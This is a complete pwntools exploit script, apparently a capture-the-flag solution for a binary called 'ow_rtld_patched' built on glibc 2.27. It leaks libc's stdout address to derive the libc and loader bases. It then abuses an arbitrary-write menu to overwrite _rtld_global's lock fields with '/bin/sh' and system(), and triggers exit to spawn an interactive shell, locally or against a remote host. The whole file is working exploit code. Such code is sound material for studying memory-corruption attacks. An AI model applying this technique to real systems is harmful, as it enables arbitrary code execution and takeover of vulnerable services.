#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ow_rtld_patched')
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.recvuntil(b"stdout: ")
    stdout = int(io.recvline().strip(), 16)
    libc.address = stdout - libc.sym["_IO_2_1_stdout_"]
    ld_base = libc.address + 0x3f1000

    info("libc base: %#x", libc.address)
    info("ld base: %#x", ld_base)

    rtld_global = ld_base + ld.sym["_rtld_global"]
    _dl_rtld_lock_recursive = rtld_global + 3840
    _dl_load_lock = rtld_global + 2312

    info("_dl_rtld_lock_recursive: %#x", _dl_rtld_lock_recursive)
    info("_dl_load_lock: %#x", _dl_load_lock)

    sh = u64(b"/bin/sh\x00")
    system = libc.sym["system"]

    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"addr: ", str(_dl_load_lock).encode())
    io.sendlineafter(b"data:", str(sh).encode())

    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"addr: ", str(_dl_rtld_lock_recursive).encode())
    io.sendlineafter(b"data:", str(system).encode())

    io.sendline(b"2")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

